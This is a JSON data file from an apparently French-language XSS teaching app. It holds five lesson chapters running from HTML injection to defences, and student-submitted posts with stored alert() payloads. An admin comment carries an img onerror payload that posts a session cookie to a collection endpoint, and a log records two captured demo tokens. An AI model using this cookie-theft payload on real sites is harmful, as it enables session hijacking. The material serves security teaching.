{
  "chapters": [
    {
      "id": "chapter1",
      "title": "Chapitre 1 : Introduction - Injection HTML basique",
      "order": 1,
      "content": "\n<h3>Objectif</h3>\n<p>Comprendre comment l'injection HTML fonctionne et ses limites.</p>\n\n<h3>Concept</h3>\n<p>L'injection HTML permet d'inserer du code HTML dans une page web. Ce n'est pas encore du JavaScript, mais c'est la premiere etape.</p>\n\n<h3>Exemples a tester</h3>\n<ul>\n  <li><code>&lt;strong&gt;Texte en gras&lt;/strong&gt;</code></li>\n  <li><code>&lt;i&gt;Texte en italique&lt;/i&gt;</code></li>\n  <li><code>&lt;h1&gt;Grand titre&lt;/h1&gt;</code></li>\n</ul>\n\n<h3>Exercice</h3>\n<p>Essayez d'injecter du HTML dans le champ ci-dessous et observez le resultat.</p>\n        ",
      "instructions": "Postez un message avec du HTML et observez comment il est rendu."
    },
    {
      "id": "chapter2",
      "title": "Chapitre 2 : XSS simple avec alert()",
      "order": 2,
      "content": "\n<h3>Objectif</h3>\n<p>Executer du JavaScript dans le navigateur via une faille XSS.</p>\n\n<h3>Concept</h3>\n<p>Le Cross-Site Scripting (XSS) permet d'executer du code JavaScript arbitraire dans le navigateur de la victime.</p>\n\n<h3>Payloads classiques</h3>\n<ul>\n  <li><code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code></li>\n  <li><code>&lt;img src=x onerror=\"alert('XSS')\"&gt;</code></li>\n</ul>\n\n<h3>Exercice</h3>\n<p>Essayez de declencher une alerte JavaScript dans votre navigateur.</p>\n        ",
      "instructions": "Utilisez un des payloads ci-dessus pour declencher une alerte."
    },
    {
      "id": "chapter3",
      "title": "Chapitre 3 : XSS stocke (Stored XSS)",
      "order": 3,
      "content": "\n<h3>Objectif</h3>\n<p>Comprendre la difference entre XSS reflechi et XSS stocke.</p>\n\n<h3>Concept</h3>\n<p>Un XSS stocke (ou persistant) est sauvegarde dans la base de donnees et execute chaque fois qu'un utilisateur visite la page.</p>\n\n<h3>Danger</h3>\n<p>C'est le type de XSS le plus dangereux car il affecte tous les utilisateurs qui visitent la page, pas seulement celui qui a clique sur un lien malveillant.</p>\n\n<h3>Exercice</h3>\n<p>Postez un message avec du JavaScript. Rechargez la page. Le script s'execute-t-il a nouveau ?</p>\n        ",
      "instructions": "Postez un payload XSS et observez s'il persiste apres rechargement."
    },
    {
      "id": "chapter4",
      "title": "Chapitre 4 : Consequences d'une attaque XSS",
      "order": 4,
      "content": "\n<h3>Objectif</h3>\n<p>Comprendre les risques reels d'une faille XSS.</p>\n\n<h3>Risques potentiels</h3>\n<ul>\n  <li><strong>Vol de session :</strong> Un attaquant peut voler les cookies de session</li>\n  <li><strong>Phishing :</strong> Affichage de faux formulaires de connexion</li>\n  <li><strong>Defacement :</strong> Modification du contenu de la page</li>\n  <li><strong>Keylogging :</strong> Capture des saisies clavier</li>\n  <li><strong>Propagation :</strong> Creation de vers XSS</li>\n</ul>\n\n<h3>Note pedagogique</h3>\n<p>Dans cette demo, nous utilisons un <code>demoToken</code> pour simuler un cookie de session. Aucune donnee reelle n'est collectee.</p>\n\n<h3>Exercice</h3>\n<p>Reflechissez aux consequences possibles si un attaquant pouvait executer du JavaScript sur un site de banque ou de commerce.</p>\n        ",
      "instructions": "Comprendre les risques et reflechir aux consequences."
    },
    {
      "id": "chapter5",
      "title": "Chapitre 5 : Defenses contre XSS",
      "order": 5,
      "content": "\n<h3>Objectif</h3>\n<p>Apprendre les techniques de protection contre les attaques XSS.</p>\n\n<h3>1. Echappement (Escaping)</h3>\n<p>Convertir les caracteres speciaux HTML en entites :</p>\n<ul>\n  <li><code>&lt;</code> devient <code>&amp;lt;</code></li>\n  <li><code>&gt;</code> devient <code>&amp;gt;</code></li>\n</ul>\n\n<h3>2. Sanitization</h3>\n<p>Utiliser des bibliotheques comme DOMPurify ou sanitize-html.</p>\n\n<h3>3. Content Security Policy (CSP)</h3>\n<p>Definir une politique de securite pour limiter les sources de scripts.</p>\n\n<h3>4. Cookies HttpOnly</h3>\n<p>Empecher l'acces aux cookies via JavaScript.</p>\n\n<h3>Mode SAFE</h3>\n<p>Dans cette app, basculez en mode SAFE pour voir le contenu echappe.</p>\n        ",
      "instructions": "Comparez le rendu en mode SAFE vs UNSAFE."
    }
  ],
  "posts": {
    "chapter1": [
      {
        "id": "1770303622082",
        "content": "<strong>Texte en gras</strong>",
        "author": "admin",
        "timestamp": "2026-02-05T15:00:22.082Z",
        "safe": false
      },
      {
        "id": "1770303635368",
        "content": "<strong>gras</strong>",
        "author": "admin",
        "timestamp": "2026-02-05T15:00:35.369Z",
        "safe": true
      }
    ],
    "chapter3": [
      {
        "id": "1770304016997",
        "content": "<strong>neuille</strong>",
        "author": "test",
        "timestamp": "2026-02-05T15:06:56.997Z",
        "safe": false
      }
    ],
    "chapter5": [
      {
        "id": "1770304091880",
        "content": "<strong>NEU</strong>",
        "author": "test",
        "timestamp": "2026-02-05T15:08:11.880Z",
        "safe": false
      }
    ],
    "chapter2": [
      {
        "id": "1770304388957",
        "content": "<script>alert('XSS')</script>",
        "author": "matew",
        "timestamp": "2026-02-05T15:13:08.957Z",
        "safe": false
      },
      {
        "id": "1770304397157",
        "content": "<strong>gras</strong",
        "author": "matew",
        "timestamp": "2026-02-05T15:13:17.157Z",
        "safe": false
      },
      {
        "id": "1770304407709",
        "content": "<strong>gras</strong>",
        "author": "matew",
        "timestamp": "2026-02-05T15:13:27.709Z",
        "safe": false
      },
      {
        "id": "1770304430877",
        "content": "v",
        "author": "matew",
        "timestamp": "2026-02-05T15:13:50.877Z",
        "safe": true
      }
    ]
  },
  "comments": {
    "chapter1": [
      {
        "id": "1770304328019",
        "content": "Hugo il a pas l'argent pour le voyage d'étude",
        "author": "matew",
        "timestamp": "2026-02-05T15:12:08.019Z"
      },
      {
        "id": "1770304342253",
        "content": "<script>alert('XSS')</script>",
        "author": "matew",
        "timestamp": "2026-02-05T15:12:22.253Z"
      }
    ],
    "chapter3": [
      {
        "id": "1770304534337",
        "content": "Explosé",
        "author": "matew",
        "timestamp": "2026-02-05T15:15:34.337Z"
      }
    ]
  },
  "globalAdminComments": [
    {
      "id": "1770304586705",
      "content": "<img src=\"x\" onerror=\"fetch('/api/collect',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({demoToken:document.cookie.match(/demoToken=([^;]+)/)?.[1],userName:'test'})})\">",
      "timestamp": "2026-02-05T15:16:26.705Z"
    }
  ],
  "captures": [
    {
      "id": "1770304588935",
      "demoToken": "DEMO-492ubyx4aer",
      "userName": "test",
      "password": null,
      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36",
      "captureType": "cookie",
      "timestamp": "2026-02-05T15:16:28.935Z"
    },
    {
      "id": "1770304619554",
      "demoToken": "DEMO-fxqzcmuu8su",
      "userName": "test",
      "password": null,
      "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36 Edg/144.0.0.0",
      "captureType": "cookie",
      "timestamp": "2026-02-05T15:16:59.554Z"
    }
  ]
}